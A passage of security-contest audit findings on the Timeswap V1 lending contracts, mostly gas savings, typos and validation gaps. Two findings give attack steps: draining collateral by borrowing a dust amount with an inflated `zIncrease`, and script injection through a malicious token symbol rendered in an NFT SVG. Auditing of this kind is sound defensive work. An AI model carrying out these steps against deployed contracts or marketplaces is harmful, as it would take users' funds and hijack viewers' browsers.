dues[ids[i]];     require(due.startBlock != BlockNumber.get(), 'E207');     if (owner != msg.sender) require(collateralsOut[i] == 0, 'E213');     require(uint256(assetIn[i]) * due.collateral >= uint256(collateralOut[i]) * due.debt, 'E303');     due.debt -= assetsIn[i];     due.collateral -= collateralsOut[i];     assetIn += assetsIn[i];     collateralOut += collateralsOut[i]; } ```   
# Handle  WatchPug   # Vulnerability details  In the current implementation, `borrow()` takes a user input value of `zIncrease`, while the actual collateral asset transferred in is calculated at L319, the state of `pool.state.z` still increased by the value of the user's input at L332.  Even though a large number of `zIncrease` means that the user needs to add more collateral, the attacker can use a dust amount `xDecrease` (1 wei for example) so that the total collateral needed is rather small.  Plus, the attacker can always `pay()` the dust amount of loan to get back the rather large amount of collateral added.  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L299-L338  ```solidity function borrow(     uint256 maturity,     address assetTo,     address dueTo,     uint112 xDecrease,     uint112 yIncrease,     uint112 zIncrease,     bytes calldata data ) external override lock returns (uint256 id, Due memory dueOut) {     require(block.timestamp < maturity, 'E202');     require(assetTo != address(0) && dueTo != address(0), 'E201');     require(assetTo != address(this) && dueTo != address(this), 'E204');     require(xDecrease > 0, 'E205');      Pool storage pool = pools[maturity];     require(pool.state.totalLiquidity > 0, 'E206');      BorrowMath.check(pool.state, xDecrease, yIncrease, zIncrease, fee);      dueOut.debt = BorrowMath.getDebt(maturity, xDecrease, yIncrease);     dueOut.collateral = BorrowMath.getCollateral(maturity, pool.state, xDecrease, zIncrease);     dueOut.startBlock = BlockNumber.get();      Callback.borrow(collateral, dueOut.collateral, data);      id = pool.dues[dueTo].insert(dueOut);      pool.state.reserves.asset -= xDecrease;     pool.state.reserves.collateral += dueOut.collateral;     pool.state.totalDebtCreated += dueOut.debt;      pool.state.x -= xDecrease;     pool.state.y += yIncrease;     pool.state.z += zIncrease;      asset.safeTransfer(assetTo, xDecrease);      emit Sync(maturity, pool.state.x, pool.state.y, pool.state.z);     emit Borrow(maturity, msg.sender, assetTo, dueTo, xDecrease, id, dueOut); } ```  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/libraries/BorrowMath.sol#L62-L79  ```solidity function getCollateral(     uint256 maturity,     IPair.State memory state,     uint112 xDecrease,     uint112 zIncrease ) internal view returns (uint112 collateralIn) {     uint256 _collateralIn = maturity;     _collateralIn -= block.timestamp;     _collateralIn *= zIncrease;     _collateralIn = _collateralIn.shiftRightUp(25);     uint256 minimum = state.z;     minimum *= xDecrease;     uint256 denominator = state.x;     denominator -= xDecrease;     minimum = minimum.divUp(denominator);     _collateralIn += minimum;     collateralIn = _collateralIn.toUint112(); } ```  ## PoC  Near the maturity time, the attacker can do the following:  1. `borrow()` a dust amount of assets (`xDecrease` = 1 wei) and increase `pool.state.z` to an extremely large value (20x of previous `state.z` in our tests); 2. `pay()` the loan and get back the collateral; 3. `lend()` a regular amount of `state.x`, get a large amount of insurance token; 4. `burn()` the insurance token and get a large portion of the collateral assets from the defaulted loans.  ## Recommendation  Consider making `pair.borrow()` to be `onlyConvenience`, so that `zIncrease` will be a computed value (based on `xDecrease` and current state) rather than a user input value.  
# Handle  WatchPug   # Vulnerability details  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/DateTime.sol#L127-L134  ```solidity     function isValidDate(uint year, uint month, uint day) internal pure returns (bool valid) {         if (year >= 1970 && month > 0 && month <= 12) {             uint daysInMonth = _getDaysInMonth(year, month);             if (day > 0 && day <= daysInMonth) {                 valid = true;             }         }     } ```  The local variable `daysInMonth` is used only once. Making the expression inline can save gas.  ### Recommendation  Change to:  ```solidity     function isValidDate(uint year, uint month, uint day) internal pure returns (bool valid) {         if (year >= 1970 && month > 0 && month <= 12) {             if (day > 0 && day <= _getDaysInMonth(year, month)) {                 valid = true;             }         }     } ```  Other examples include:  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/Burn.sol#L76-L77  ```solidity         IPair pair = factory.getPair(params.asset, params.collateral);         require(address(pair) != address(0), 'E501'); ```  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/TimeswapConvenience.sol#L556-L558  ```solidity         IDue collateralizedDebt = natives[asset][collateral][maturity].collateralizedDebt;          require(msg.sender == address(collateralizedDebt), 'E701'); ```  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/libraries/Callback.sol#L62-L63  ```solidity         uint256 _assetReserve = asset.safeBalance();         require(_assetReserve >= assetReserve + assetIn, 'E304'); ```  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/libraries/Callback.sol#L51-L52  ```solidity         uint256 _collateralReserve = collateral.safeBalance();         require(_collateralReserve >= collateralReserve + collateralIn, 'E305'); ```  
# Handle  WatchPug   # Vulnerability details  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/libraries/Callback.sol#L5-L5  ```solidity import {IPair} from '../interfaces/IPair.sol'; ```  `IPair` is unused in `Callback.sol`.  
# Handle  WatchPug   # Vulnerability details  `flag == 0` is cheaper than `temp % 10 == 0`.   Therefore, checking `flag == 0 `first can save some gas.  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/NFTTokenURIScaffold.sol#L162-L162  ```solidity if (temp % 10 == 0 && flag == 0) ```  ### Recommendation  Change to:  ```solidity     if (flag == 0 && temp % 10 == 0)  ```  Other instances include:  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/NFTTokenURIScaffold.sol#L180-L180  ```solidity else if (value % 10 != 0 && flag == 0)  ```  
# Handle  WatchPug   # Vulnerability details  For the arithmetic operations that will never over/underflow, using the unchecked directive (Solidity v0.8 has default overflow/underflow checks) can save some gas from the unnecessary internal over/underflow checks.  For example:  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L149-L150  ```solidity         require(block.timestamp < maturity, 'E202');         require(maturity - block.timestamp < 0x100000000, 'E208'); ```   `maturity - block.timestamp` will never underflow.   https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/libraries/WithdrawMath.sol#L31-L33  ```solidity         if (state.reserves.asset >= state.totalClaims.bond) return collateralOut;         uint256 deficit = state.totalClaims.bond;         deficit -= state.reserves.asset; ```  `deficit -= state.reserves.asset` will never underflow.   https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/MsgValue.sol#L12-L12  ```solidity if (msg.value > value) ETH.transfer(payable(msg.sender), msg.value - value); ```  `msg.value - value` will never underflow.  
# Handle  WatchPug   # Vulnerability details  Move storage writes to inside the code block of `if (tokensOut.asset > 0) {...}` can avoid unnecessary code execution when this check doesn't pass and save gas.  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L214-L218  ```solidity         pool.state.reserves.asset -= tokensOut.asset;         pool.state.reserves.collateral -= tokensOut.collateral;          if (tokensOut.asset > 0) asset.safeTransfer(assetTo, tokensOut.asset);         if (tokensOut.collateral > 0) collateral.safeTransfer(collateralTo, tokensOut.collateral); ``` ### Recommendation  Change to:  ```solidity         if (tokensOut.asset > 0) {                 pool.state.reserves.asset -= tokensOut.asset;                 asset.safeTransfer(assetTo, tokensOut.asset);         }         if (tokensOut.collateral > 0) {                 pool.state.reserves.collateral -= tokensOut.collateral;                 collateral.safeTransfer(collateralTo, tokensOut.collateral);         } ```    
# Handle  WatchPug   # Vulnerability details  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L157-L169  ```solidity=157 if (pool.state.totalLiquidity == 0) {     uint256 liquidityTotal = MintMath.getLiquidityTotal(xIncrease);     liquidityOut = MintMath.getLiquidity(maturity, liquidityTotal, protocolFee);      pool.state.totalLiquidity += liquidityTotal;     pool.liquidities[factory.owner()] += liquidityTotal - liquidityOut; } else {     uint256 liquidityTotal = MintMath.getLiquidityTotal(pool.state, xIncrease, yIncrease, zIncrease);     liquidityOut = MintMath.getLiquidity(maturity, liquidityTotal, protocolFee);      pool.state.totalLiquidity += liquidityTotal;     pool.liquidities[factory.owner()] += liquidityTotal - liquidityOut; } ```  ### Recommendation  Change to:  ```solidity=157 uint256 liquidityTotal = pool.state.totalLiquidity == 0 ?     MintMath.getLiquidityTotal(xIncrease) :     MintMath.getLiquidityTotal(pool.state, xIncrease, yIncrease, zIncrease); liquidityOut = MintMath.getLiquidity(maturity, liquidityTotal, protocolFee);  pool.state.totalLiquidity += liquidityTotal; pool.liquidities[factory.owner()] += liquidityTotal - liquidityOut; ```  1. Avoiding code duplication; 2. Using the ternary operator to make the code shorter.  
# Handle  WatchPug   # Vulnerability details  Reading array length at each iteration of the loop takes 6 gas (3 for mload and 3 to place memory_offset) in the stack.  Caching the array length in the stack saves around 3 gas per iteration.  Instances include:  - `TimeswapPair.sol#pay()`      https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L359-L359   - `PayMath.sol#givenMaxAssetsIn()`      https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/PayMath.sol#L21-L21   
# Handle  rfa   # Vulnerability details  ## Impact more expensive gas  ## Proof of Concept https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L58  instead of caching state on memory. just read it directly from the storage.  State memory state = pools[maturity].state;  ## Tools Used self research on:  https://remix.ethereum.org/  ## Recommended Mitigation Steps State storage state = pools[maturity].state;  
# Handle  ye0lde   # Vulnerability details  # Vulnerability details  ## Impact Open TODOs can point to architecture or programming issues that still need to be resolved.  ## Proof of Concept The TODO is here: https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/NFTTokenURIScaffold.sol#L87  ## Tools Used VS Code  ## Recommended Mitigation Steps Consider resolving the TODO before deploying.  
# Handle  ye0lde   # Vulnerability details  ## Impact  The function below fails to perform input validation on arrays to verify the lengths match.  A mismatch could lead to an exception or undefined behavior.  ## Proof of Concept  `ids`, `assetsIn` (copied into from `maxAssetsIn` on line 18) https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/PayMath.sol#L15-L28  While `givenMaxAssetsIn` is an internal function if you trace the code back the parameters are passed in by an external function (`pay` or `payEthAsset` or `payEthCollateral`) with no array length validation.  ## Tools Used Visual Studio Code, Remix  ## Recommended Mitigation Steps  Add input validation to check that the length of all arrays match (`ids`, `maxAssetsIn`).  
# Handle  ye0lde   # Vulnerability details  # Vulnerability details  ## Impact Typos  ## Proof of Concept The typos are here:  'recommnded' https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/TimeswapFactory.sol#L11 https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L20  'seconde' https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/interfaces/IFactory.sol#L39  'addres' 'dcrease' https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/interfaces/IPair.sol#L319-L320   ## Tools Used VS Code  ## Recommended Mitigation Steps Correct the typos  
# Handle  thank_you   # Vulnerability details  ## Impact SVG is a unique type of image file format that is often susceptible to Cross-site scripting. If a malicious user is able to inject malicious Javascript into a SVG file, then any user who views the SVG on a website will be susceptible to XSS. This can lead stolen cookies, Denial of Service attacks, and more.  The `NFTTokenURIScaffold` contract generates a SVG via the `NFTSVG.constructSVG` function. One of the arguments used by the `NFTSVG.constructSVG` function is `svgTitle` which represents the ERC20 symbols of both the asset and collateral ERC20 tokens. When generating an ERC20 contract, a malicious user can set malicious XSS as the ERC20 symbol.   These set of circumstances leads to XSS when the SVG is loaded on any website.   ## Proof of Concept 1. Hacker generates an ERC20 token with a symbol that contains malicious Javascript. 2. Hacker generates a TimeSwap Pair with an asset or collateral that matches the malicious ERC20 token created in Step 1. 3. When `NFTTokenURIScaffold#constructTokenURI` is called, a SVG is generated. This process works such that when generating the SVG the tainted ERC20 symbol created in Step 1 is [passed](https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/libraries/NFTTokenURIScaffold.sol#L90) to the `NFTSVG.constructSVG` function [here](https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/libraries/NFTTokenURIScaffold.sol#L102). This function returns a SVG [containing](https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/libraries/NFTSVG.sol#L27) the tainted ERC20 symbol. 4. When the SVG is loaded on any site such as OpenSea, any user viewing that SVG will load the malicious Javascript from within the SVG and result in a XSS attack.   ## Tools Used N/A  ## Recommended Mitigation Steps Creating a SVG file inside of a Solidity contract is novel and thus requires the entity creating a SVG file to sanitize any potential user-input that goes into generating the SVG file.   As of this time there are no known Solidity libraries that sanitize text to prevent an XSS attack. The easiest solution is to remove all user-input data from the SVG file or not generate the SVG at all.   
# Handle  OriDabush   # Vulnerability details  # TimeswapPair.sol - Gas Optimization Lines 289-290 can be transferred into the if statements to avoid subtract 0 from the variables.  ### code before: pool.state.reserves.asset -= tokensOut.asset;  pool.state.reserves.collateral -= tokensOut.collateral;  if (tokensOut.asset > 0) asset.safeTransfer(assetTo, tokensOut.asset);  if (tokensOut.collateral > 0) collateral.safeTransfer(collateralTo, tokensOut.collateral);  ### code after:  if (tokensOut.asset > 0) {     asset.safeTransfer(assetTo, tokensOut.asset);     pool.state.reserves.asset -= tokensOut.asset; }  if (tokensOut.collateral > 0) {     collateral.safeTransfer(collateralTo, tokensOut.collateral);     pool.state.reserves.collateral -= tokensOut.collateral; }     
# Handle  Dravee   # Vulnerability details  ## Impact   If a variable is not set/initialized, it is assumed to have the default value (0, false, 0x0 etc depending on the data type). Explicitly initializing it with its default value is an anti-pattern and wastes gas.    ## Proof of Concept   Instances include:   ``` Timeswap-V1-Convenience\contracts\libraries\NFTTokenURIScaffold.sol:119:        for(uint i = 0; i < lengthDiff; i++) { Timeswap-V1-Convenience\contracts\libraries\NFTTokenURIScaffold.sol:147:        for(uint i = 0; i < lengthDiff; i++) { Timeswap-V1-Convenience\contracts\libraries\NFTTokenURIScaffold.sol:201:        for (uint256 i = 0; i < data.length; i++) { ```     ## Tools Used   Manual Analysis      ## Recommended Mitigation Steps   Remove explicit initialization for default values.   
# Handle  sirhashalot   # Vulnerability details  ## Impact  The `safeSymbol()` function, found in the SafeMetadata.sol contract and called in 4 Timeswap Convenience contracts in the `symbol()` functions, can cause a revert. This could make the 4 contracts not compliant with the ERC20 standard for certain asset pairs, because the `symbol()` function should return a string and not revert.  The root cause of the issue is that the `safeSymbol()` function assumes the return type of any ERC20 token to be a string. If the return value is not a string, abi.decode() will revert, and this will cause the `symbol()` functions in the Timeswap ERC20 contracts to revert.  Because this is known to cause issues with tokens that don't fully follow the ERC20 spec, the `safeSymbol()` function in the BoringCrypto library has a fix for this. The BoringCrypto `safeSymbol()` function is similar to the one in Timeswap but it has a `returnDataToString()` function that handles the case of a bytes32 return value for a token name: https://github.com/boringcrypto/BoringSolidity/blob/ccb743d4c3363ca37491b87c6c9b24b1f5fa25dc/contracts/libraries/BoringERC20.sol#L15-L39  ## Proof of Concept  The root cause is [line 20](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/SafeMetadata.sol#L20)  of the `safeSymbol()` function in SafeMetadata.sol  The `safeSymbol()` function is called in: - [Bond.sol](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/Bond.sol#L27-L31) - [CollateralizedDebt.sol](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/CollateralizedDebt.sol#L38-L42) - [Insurance.sol](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/Insurance.sol#L29-L33) - [Liquidity.sol](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/Liquidity.sol#L31-L35)  ## Recommended Mitigation Steps  Use the BoringCrypto `safeSymbol()` function code with the `returnDataToString()` parsing function to handle the case of a bytes32 return value: https://github.com/boringcrypto/BoringSolidity/blob/ccb743d4c3363ca37491b87c6c9b24b1f5fa25dc/contracts/libraries/BoringERC20.sol#L15-L39  
# Handle  sirhashalot   # Vulnerability details  ## Impact  The `safeName()` function, found in the SafeMetadata.sol contract and called in 4 Timeswap Convenience contracts in the `name()` functions, can cause a revert. This could make the 4 contracts not compliant with the ERC20 standard for certain asset pairs, because the `name()` function should return a string and not revert.  The root cause of the issue is that the `safeName()` function assumes the return type of any ERC20 token to be a string. If the return value is not a string, abi.decode() will revert, and this will cause the `name()` functions in the Timeswap ERC20 contracts to revert. There are some tokens that aren't compliant, such as Sai from Maker, which returns a bytes32 value:  https://kauri.io/#single/dai-token-guide-for-developers/#token-info  Because this is known to cause issues with tokens that don't fully follow the ERC20 spec, the `safeName()` function in the BoringCrypto library has a fix for this. The BoringCrypto `safeName()` function is similar to the one in Timeswap but it has a `returnDataToString()` function that handles the case of a bytes32 return value for a token name: https://github.com/boringcrypto/BoringSolidity/blob/ccb743d4c3363ca37491b87c6c9b24b1f5fa25dc/contracts/libraries/BoringERC20.sol#L15-L47  ## Proof of Concept  The root cause is [line 12](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/SafeMetadata.sol#L12) of the `safeName()` function in SafeMetadata.sol  The `safeName()` function is called in: - [Bond.sol](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/Bond.sol#L20-L25) - [CollateralizedDebt.sol](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/CollateralizedDebt.sol#L22-L36) - [Insurance.sol](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/Insurance.sol#L20-L27) - [Liquidity.sol](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/Liquidity.sol#L22-L29)  ## Recommended Mitigation Steps  Use the BoringCrypto `safeName()` function code to handle the case of a bytes32 return value: https://github.com/boringcrypto/BoringSolidity/blob/ccb743d4c3363ca37491b87c6c9b24b1f5fa25dc/contracts/libraries/BoringERC20.sol#L15-L47  
# Handle  sirhashalot   # Vulnerability details  ## Impact  The `safeDecimals()` function, found in the SafeMetadata.sol contract and called in 3 different Timeswap Convenience contracts, can cause a revert. This is because the safeDecimals function attempts to use abi.decode to return a uint8 when `data.length >= 32`. However, a data.length value greater than 32 will cause abi.decode to revert.  A similar issue was found in a previoud code4rena contest: https://github.com/code-423n4/2021-05-nftx-findings/issues/46  ## Proof of Concept  The root cause is [line 28](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/SafeMetadata.sol#L28) of the `safeDecimals()` function in SafeMetadata.sol  The following link shows the `safeDecimals()` function in the BoringCrypto library, which might be where this code was borrowed from, uses the strict equality check `data.length == 32` https://github.com/boringcrypto/BoringSolidity/blob/ccb743d4c3363ca37491b87c6c9b24b1f5fa25dc/contracts/libraries/BoringERC20.sol#L54  `safeDecimals()` is used in multiple functions such as - CollateralizedDebt.sol [line 50](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/CollateralizedDebt.sol#L50) and [line 54](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/CollateralizedDebt.sol#L54) - Bond.sol [line 34](https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/Bond.sol#L34) - Insurance.sol [line 36](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/Insurance.sol#L36)  ## Recommended Mitigation Steps  Modify the `safeDecimals()` function to change >= 32 to == 32 like this `if (success && data.length == 32) return   abi.decode(data, (uint8));`  
# Handle  p4st13r4   # Vulnerability details  ## Impact  In `TimeswapConvenience.sol` the `weth` state variable is read twice. It can just be immediately assigned locally so that the two `deposit` calls avoid reading the same variable from storage  ## Proof of Concept  - [https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/TimeswapConvenience.sol#L505](https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/TimeswapConvenience.sol#L505) - [https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/TimeswapConvenience.sol#L512](https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/TimeswapConvenience.sol#L512)  ## Tools Used  Editor  ## Recommended Mitigation Steps  Assign `weth` to `localWeth`  
# Handle  p4st13r4   # Vulnerability details  ## Impact  In `CollateralizedDebt.sol` the `pair` state variable is read twice. It can just be immediately assigned locally so that the `require` and the `collateralizedDebtCallback` do not read the same state variable twice  ## Proof of Concept  ```jsx function timeswapPayCallback(uint128 assetIn, bytes calldata data) external override {     require(msg.sender == address(pair), 'E401');      convenience.collateralizedDebtCallback(pair, maturity, assetIn, data); } ```  ## Tools Used  Editor  ## Recommended Mitigation Steps  Assign `pair` to e.g `localPair`  
# Handle  Meta0xNull   # Vulnerability details  ## Impact A wrong user input or wallets defaulting to the zero addresses for a missing input can lead to the contract needing to redeploy or wasted gas.  ## Proof of Concept https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/TimeswapConvenience.sol#L62-L64  ## Tools Used Manual Review  ## Recommended Mitigation Steps requires Addresses is not zero.  require(_factory != address(0), "Address Can't Be Zero") require(_weth != address(0), "Address Can't Be Zero")  
# Handle  hyh   # Vulnerability details  ## Impact  Similarly, the system will fail with low-level message without giving a business reason, which can be an issue for troubleshooting and further programmatic usages by other projects.   ## Proof of Concept  The owner variable is used by TimeswapPair.pay without validation:  https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L357  Which will yield low-level fail on array access if an owner is zero or not present in the system:  https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L360   ## Recommended Mitigation Steps  Verify owner function argument to be non-zero by expanding existing check:  https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L352  Then, require in line 358 that, for example, dues.length >= ids.length:  https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L358   
# Handle  hyh   # Vulnerability details  ## Impact  Gas is overspent on state variables storage access.  ## Proof of Concept  getCollateral only reads state.reserves.asset, state.totalClaims.insurance and state.reserves.collateral up to 2 times each, and state.totalClaims.bond up to 4 times:  https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/libraries/WithdrawMath.sol#L26   ## Recommended Mitigation Steps  Save all four state variables to memory before running the logic.   
# Handle  hyh   # Vulnerability details  ## Impact  If there is no liquidity in the pool, burn operation will not make sense and be reverted on low level math of decreasing liquidity share. It will be more transparent and uniform to add a check for liquidity before the logic.   ## Proof of Concept  ` burn` doesn't check for liquidity of the pool:  https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L205   ## Recommended Mitigation Steps  There is a check in other relevant functions, it can be added in the very same form here: ` require(pool.state.totalLiquidity > 0, 'E206')`  Error description can be updated to include ` burn `:  https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/ErrorCodes.md#e206   
# Handle  rfa   # Vulnerability details  ## Impact more expensive gas usage  ## Proof of Concept instead of using operator && on single require check. using additional require check can save more gas:  https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L151-L152 https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L201-L202 https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L234-L235 https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L272-L273 https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L309-L310 https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L351  ## Tools Used https://remix.ethereum.org  ## Recommended Mitigation Steps example: require(liquidityTo != address(0), 'E201' ); require(dueTo != address(0), 'E201');   
# Handle  bitbopper   # Vulnerability details  ## Impact `https://github.com/code-423n4/2022-01-timeswap/blob/5960e07d39f2b4a60cfabde1bd51f4b1e62e7e85/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L121:L126` could be more gas efficient  ## Proof of Concept ### Version as in Repo  ``` // SPDX-License-Identifier: GPL-3.0-or-later pragma solidity =0.8.4;  contract LockProofOld {  uint256 locked = 0;   modifier lock() {      require(locked == 0, 'E211');      locked = 1;      _;      locked = 0;  }   function test() public lock {  }  } ``` ### Proposed Version ``` // SPDX-License-Identifier: GPL-3.0-or-later pragma solidity =0.8.4;  contract LockProofNew {  uint256 locked = 1;   modifier lock() {      require(locked == 1, 'E211');      locked = 2;      _;      locked = 1;  }   function test() public lock {  }  } ```  ### Comparison #### Test harness ``` // SPDX-License-Identifier: GPL-3.0-or-later pragma solidity =0.8.4;  import "ds-test/test.sol";  import "./LockProofOld.sol"; import "./LockProofNew.sol";  contract LockProofTest is DSTest {     LockProofOld lockproofold;     LockProofNew lockproofnew;      function setUp() public {         lockproofold = new LockProofOld();         lockproofnew = new LockProofNew();     }      function test_old() public {   lockproofold.test();     }      function test_new() public {   lockproofnew.test();     } } ``` #### Output ``` dapp test Running 2 tests for src/LockProof.t.sol:LockProofTest [PASS] test_old() (gas: 21042) [PASS] test_new() (gas: 1136) ```   
# Handle  Dravee   # Vulnerability details  ## Impact The `acceptOwner()` external function can be called indefinitely instead of only once. The contract's state doesn't reflect reality. The code doesn't follow the standard implementation of a 2-step ownership transfer.  ## Proof of Concept Here's the current `acceptOwner()` external function, which lacks a reset of `pendingOwner` to `address(0)` : ```     function acceptOwner() external override {         require(msg.sender == pendingOwner, 'E102');         owner = msg.sender;          emit AcceptOwner(msg.sender);     } ```  ## Tools Used VS Code  ## Recommended Mitigation Steps Change the code to: ```     function acceptOwner() external override {         require(msg.sender == pendingOwner, 'E102');         owner = msg.sender;         pendingOwner = address(0); // @audit : line to add          emit AcceptOwner(msg.sender);     } ```  
